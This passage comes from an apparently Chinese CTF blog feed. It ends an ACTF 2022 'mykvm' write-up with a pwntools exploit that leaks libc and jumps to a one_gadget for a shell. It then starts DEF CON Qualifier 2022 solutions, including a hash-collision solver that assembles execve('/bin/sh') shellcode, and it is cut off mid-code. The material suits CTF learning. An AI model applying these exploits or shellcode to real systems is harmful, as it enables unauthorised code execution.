keyword">start</span>mov di,<span class="token number">0x7100</span>mov al,<span class="token number">0x08</span>mov [di],almov al,<span class="token number">0x20</span>mov [di<span class="token number">+1</span>],almov al,<span class="token number">0x60</span>mov [di<span class="token number">+2</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+3</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+4</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+5</span>],alhlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'sp'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token comment">#io = process("./mykvm")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token comment">#shellcode = "\xbf\x00\x00\xba\x17\x02\x8a\x05\xee\x47\x83\xff\xff\x75\xf7\xf4"     # search all memory</span><span class="token comment">#shellcode = "\xbf\x16\x04\xba\x17\x02\x8a\x05\xee\x47\x81\xff\x1e\x04\x75\xf6\xf4" # leak where to read</span><span class="token comment">#shellcode = "\xbf\x00\x71\xba\x17\x02\x8a\x05\xee\x47\x81\xff\x08\x71\x75\xf6\xf4" # leak where to write</span>shellcode <span class="token operator">=</span> <span class="token string">"\xbf\x16\x04\xba\x17\x02\x8a\x05\xee\x47\x81\xff\x1e\x04\x75\xf6\xbf\x00\x71\xb0\x0d\x88\x05\xb0\x20\x88\x45\x01\xb0\x60\x88\x45\x02\xb0\x00\x88\x45\x03\xb0\x00\x88\x45\x04\xb0\x00\x88\x45\x05\xf4"</span><span class="token triple-quoted-string string">'''search memory:mov di,0mov dx,0x217.start:mov al,[di]out dx,alinc dicmp di,0xffffjne .starthlt'''</span><span class="token triple-quoted-string string">'''leak libc:mov di,0x416mov dx,0x217.start:mov al,[di]out dx,alinc dicmp di,0x41ejne .starthlt'''</span><span class="token triple-quoted-string string">'''leak mem idx:mov di,0x7100mov dx,0x217.start:mov al,[di]out dx,alinc dicmp di,0x7108jne .starthlt'''</span><span class="token triple-quoted-string string">'''write memory:mov di,0x416mov dx,0x217.start:mov al,[di]out dx,alinc dicmp di,0x41ejne .startmov di,0x7100mov al,0x08mov [di],almov al,0x20mov [di+1],almov al,0x60mov [di+2],almov al,0mov [di+3],almov al,0mov [di+4],almov al,0mov [di+5],alhlt'''</span><span class="token keyword">def</span> <span class="token function">save_mem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">+=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'dumpmem'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your code size: \n"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"your code: \n"</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span><span class="token comment"># gdb.attach(io,"b *0x40111d")</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"guest name: "</span><span class="token punctuation">,</span><span class="token string">"unr4v31"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"guest passwd: "</span><span class="token punctuation">,</span><span class="token string">"unr4v31"</span><span class="token punctuation">)</span><span class="token comment"># save_mem()</span><span class="token comment"># raw_input()</span><span class="token keyword">def</span> <span class="token function">findidx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        byte <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> byte <span class="token operator">==</span> <span class="token string">'\x7f'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span><span class="token comment"># findidx()</span><span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7198</span><span class="token operator">-</span><span class="token number">0x610000</span>info<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x45226</span>info<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"host name: "</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x1d</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>one_gadget<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget<span class="token operator">&amp;</span><span class="token number">0xff0000</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://lwn.net/Articles/658511/">Using the KVM API</a></p><p><a href="https://elixir.bootlin.com/linux/v5.16-rc1/source/include/uapi/linux/kvm.h#L98">kvm.h - include&#x2F;uapi&#x2F;linux&#x2F;kvm.h - Linux source code (v5.16-rc1) - Bootlin</a></p><p><a href="https://www.jianshu.com/p/5ec4507e9be0">【KVM】KVM学习-实现自己的内核</a></p><p>[<a href="https://david942j.blogspot.com/2018/10/note-learning-kvm-implement-your-own.html">Note] Learning KVM - implement your own kernel</a></p><p><a href="https://c9x.me/x86/html/file_module_x86_id_139.html">x86 Instruction Set Reference</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/28/mykvm/">ACTF 2022 Pwn mykvm</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEF CON Qualifier 2022</title>
      <link href="/2022/05/31/def-con-qualifier-2022/"/>
      <url>/2022/05/31/def-con-qualifier-2022/</url>
      
        <content type="html"><![CDATA[<p>「题目链接」：<a href="https://github.com/Nautilus-Institute/quals-2022">https://github.com/Nautilus-Institute/quals-2022</a></p><h1 id="MIC-check-1"><a href="#MIC-check-1" class="headerlink" title="MIC check 1"></a>MIC check 1</h1><p>签到题，计算给的数学题</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"simple-service-c45xrrmhuc5su.shellweplayaga.me"</span><span class="token punctuation">,</span><span class="token string">"31337"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Ticket please: "</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"ticket&#123;FreeboardPort8285n22:i1wxz8BFiFl6thcsJPGNkqiNsIZTgKdeySpriUVC4gu0WnY4&#125;"</span><span class="token punctuation">)</span>answer <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"= "</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"*"</span> <span class="token operator">*</span><span class="token number">20</span><span class="token keyword">print</span> answerq <span class="token operator">=</span> answer<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" ="</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token keyword">print</span> aio<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220531092700900.png" alt="image-20220531092700900"></p><h1 id="hash-it"><a href="#hash-it" class="headerlink" title="hash it"></a>hash it</h1><p>输入的内容分别被md5,sha1,sha256,sha512处理，每两个字节处理一次，取处理后的第一个字节拼接出shellcode执行。思路是哈希碰撞可见字符，拼接出来即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token keyword">import</span> hashlibcontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'sp'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token comment"># shellcode = '\\x50\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x54\\x5f\\xb0\\x3b\\x0f\\x05'</span>table <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890~!@#$%^&amp;*()_+-=;:\\'</span>"<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token operator">&lt;></span><span class="token operator">/</span>?`<span class="token operator">|</span>'char_table <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'j'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">,</span> <span class="token string">'Q'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'~'</span><span class="token punctuation">,</span> <span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">'@'</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'^'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'|'</span><span class="token punctuation">]</span><span class="token comment"># shellcode = ['50','48','31','d2','48','bb','2f','62','69','6e','2f','2f','73','68','53','54','5f','b0','3b','0f','05']</span><span class="token comment"># shellcode = ['50', '50', '5E', '48', '31', 'D2', '48', 'BB', '2F', '62', '69', '6E', '2F', '2F', '73', '68', '53', '54', '5F', 'B0', '3B', '0F', '05']</span>shellcode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'50'</span><span class="token punctuation">,</span><span class="token string">'48'</span><span class="token punctuation">,</span><span class="token string">'31'</span><span class="token punctuation">,</span><span class="token string">'d2'</span><span class="token punctuation">,</span><span class="token string">'48'</span><span class="token punctuation">,</span><span class="token string">'31'</span><span class="token punctuation">,</span><span class="token string">'f6'</span><span class="token punctuation">,</span><span class="token string">'48'</span><span class="token punctuation">,</span><span class="token string">'bb'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'62'</span><span class="token punctuation">,</span><span class="token string">'69'</span><span class="token punctuation">,</span><span class="token string">'6e'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'73'</span><span class="token punctuation">,</span><span class="token string">'68'</span><span class="token punctuation">,</span><span class="token string">'53'</span><span class="token punctuation">,</span><span class="token string">'54'</span><span class="token punctuation">,</span><span class="token string">'5f'</span><span class="token punctuation">,</span><span class="token string">'b0'</span><span class="token punctuation">,</span><span class="token string">'3b'</span><span class="token punctuation">,</span><span class="token string">'0f'</span><span class="token punctuation">,</span><span class="token string">'05'</span><span class="token punctuation">]</span><span class="token comment"># RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjUTYfi9JH0t800T810T850T880T8A0T8B0T8C0T8G0T8H0T8I0T8J0T8N0T8O0T8P0T8Q0T8R0T8SRAPZ0t8E0t8F0t8LZRARZ0t8MZjZTYfi9FD0t810T86RAPZ0t820t840t85ZHpzbinzshUPHAgHGFUUUUHGBUUUUHGHnUUUZP</span><span class="token keyword">def</span> <span class="token function">init_table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    char_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        char_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> char_list    <span class="token keyword">return</span> char_list<span class="token comment"># init_table()</span><span class="token keyword">def</span> <span class="token function">md5_hash_code</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash_code_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> char_table<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> char_table<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            res <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> byte<span class="token punctuation">:</span> <span class="token comment"># push rax</span>                hash_code_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span> hash_code_list<span class="token keyword">def</span> <span class="token function">sha1_hash_code</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash_code_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> char_table<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> char_table<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            res <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> byte<span class="token punctuation">:</span>                hash_code_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span> hash_code_list<span class="token keyword">def</span> <span class="token function">sha256_hash_code</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash_code_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> char_table<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> char_table<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            res <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> byte<span class="token punctuation">:</span>                hash_code_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span> hash_code_list<span class="token keyword">def</span> <span class="token function">sha512_hash_code</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash_code_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> char_table<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> char_table<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            res <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha512<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> byte<span class="token punctuation">:</span>                hash_code_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span> hash_code_list<span class="token keyword">print</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">""</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token 